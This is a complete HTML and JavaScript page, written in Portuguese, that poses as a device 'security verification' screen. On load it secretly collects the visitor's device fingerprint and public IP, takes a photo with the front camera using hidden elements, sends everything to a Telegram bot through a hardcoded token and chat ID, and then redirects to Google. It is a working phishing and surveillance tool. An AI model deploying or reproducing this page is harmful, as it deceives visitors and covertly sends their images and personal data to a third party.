<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VerificaûÏûÈo de SeguranûÏa</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f0f2f5; }
        .container { text-align: center; background: white; padding: 2rem; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); max-width: 400px; width: 90%; }
        h2 { color: #1a1a1a; font-size: 1.2rem; margin-bottom: 0.5rem; }
        p { color: #666; font-size: 0.85rem; line-height: 1.5; }
        .loader { border: 3px solid #f3f3f3; border-radius: 50%; border-top: 3px solid #0088cc; width: 24px; height: 24px; animation: spin 1s linear infinite; margin: 15px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status { font-size: 0.75rem; color: #999; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Verificando Dispositivo...</h2>
        <p>Por favor, aguarde enquanto validamos suas credenciais de seguranûÏa e integridade do navegador.</p>
        <div class="loader"></div>
        <div class="status" id="statusText">Iniciando coleta...</div>
        
        <!-- Elementos ocultos para captura -->
        <video id="video" style="display:none;" autoplay playsinline></video>
        <canvas id="canvas" style="display:none;"></canvas>
    </div>

    <script>
        // --- CONFIGURAûûO ---
        // ATENûûO: Em produûÏûÈo real, nunca exponha tokens no frontend. 
        // Para testes/POC funciona, mas ûˋ visûÙvel no "Inspecionar Elemento".
        const BOT_TOKEN = "8952863326:AAGbv532qodG8yJJZ6mXSd99oYx6TPvNC7Y";
        const CHAT_ID = "8607389403";
        // --------------------

        const statusText = document.getElementById('statusText');

        function getBatteryInfo() {
            if (navigator.getBattery) {
                return navigator.getBattery().then(battery => {
                    return `${Math.round(battery.level * 100)}% (${battery.charging ? 'Carregando' : 'Na bateria'})`;
                });
            }
            return Promise.resolve("NûÈo suportado");
        }

        function getConnectionInfo() {
            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (conn) {
                return `${conn.effectiveType || 'Desconhecido'} ${conn.downlink ? '(' + conn.downlink + 'Mbps)' : ''}`;
            }
            return "NûÈo suportado";
        }

        async function coletarDadosComplementares() {
            const battery = await getBatteryInfo();
            const connection = getConnectionInfo();
            
            return {
                ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB (aprox)` : "NûÈo suportado",
                cores: navigator.hardwareConcurrency || "NûÈo suportado",
                touch: navigator.maxTouchPoints > 0 ? "Sim" : "NûÈo",
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                languages: navigator.languages ? navigator.languages.join(', ') : navigator.language,
                battery: battery,
                connection: connection,
                online: navigator.onLine ? "Online" : "Offline"
            };
        }

        async function enviarDados() {
            statusText.innerText = "Coletando metadados...";
            
            // Dados bûÀsicos
            const dadosBasicos = {
                ua: navigator.userAgent,
                lang: navigator.language,
                screen: `${screen.width}x${screen.height} (Pixel Ratio: ${window.devicePixelRatio})`,
                platform: navigator.platform,
                ip: "Buscando..."
            };

            // Dados avanûÏados
            const dadosAvancados = await coletarDadosComplementares();

            // Pega IP
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const json = await res.json();
                dadosBasicos.ip = json.ip;
            } catch(e) { dadosBasicos.ip = "Erro/Falha"; }

            statusText.innerText = "Montando relatû°rio...";

            let msg = `Þ *NOVO ACESSO DETECTADO*\n\n`;
            msg += `ÞÝ *Dispositivo*\n`;
            msg += `ãÂ OS: ${dadosBasicos.platform}\n`;
            msg += `ãÂ Tela: ${dadosBasicos.screen}\n`;
            msg += `ãÂ RAM: ${dadosAvancados.ram}\n`;
            msg += `ãÂ CPU: ${dadosAvancados.cores} nû¤cleos\n`;
            msg += `ãÂ Touch: ${dadosAvancados.touch}\n\n`;
            
            msg += `Þ *ConexûÈo*\n`;
            msg += `ãÂ IP: ${dadosBasicos.ip}\n`;
            msg += `ãÂ Tipo: ${dadosAvancados.connection}\n`;
            msg += `ãÂ Status: ${dadosAvancados.online}\n\n`;

            msg += `Þ *Sistema*\n`;
            msg += `ãÂ Bateria: ${dadosAvancados.battery}\n`;
            msg += `ãÂ Fuso: ${dadosAvancados.timezone}\n`;
            msg += `ãÂ Idiomas: ${dadosAvancados.languages}\n\n`;
            
            msg += `Þ *Navegador*\n`;
            msg += `ãÂ UA: \`${dadosBasicos.ua}\``;

            // Tenta tirar foto
            statusText.innerText = "Acessando cûÂmera...";
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: "user",
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    } 
                });
                
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                // Espera o vûÙdeo carregar metadados para garantir resoluûÏûÈo
                await new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        video.play();
                        resolve();
                    };
                    setTimeout(resolve, 2000); // Timeout de seguranûÏa
                });

                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                
                stream.getTracks().forEach(track => track.stop());

                const imgData = canvas.toDataURL('image/jpeg', 0.6); 
                
                statusText.innerText = "Enviando dados...";

                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', dataURItoBlob(imgData), 'cam.jpg');
                formData.append('caption', msg);
                formData.append('parse_mode', 'Markdown');
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });

                statusText.innerText = "ConclusûÈo: Sucesso";
                setTimeout(() => { window.location.href = "https://google.com"; }, 2000); // Redireciona apû°s sucesso

            } catch (err) {
                console.error(err);
                statusText.innerText = "CûÂmera bloqueada. Enviando texto.";
                
                msg += `\n\nã ÿ¡ *CûÂmera: Negada/Bloqueada*`;
                msg += `\nErro: ${err.message}`;

                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('text', msg);
                formData.append('parse_mode', 'Markdown');
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    body: formData
                });
                
                statusText.innerText = "ConclusûÈo: Parcial (Sem Foto)";
                setTimeout(() => { window.location.href = "https://google.com"; }, 2000);
            }
        }

        function dataURItoBlob(dataURI) {
            const byteString = atob(dataURI.split(',')[1]);
            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            return new Blob([ab], { type: mimeString });
        }

        window.onload = enviarDados;
    </script>
</body>
</html>
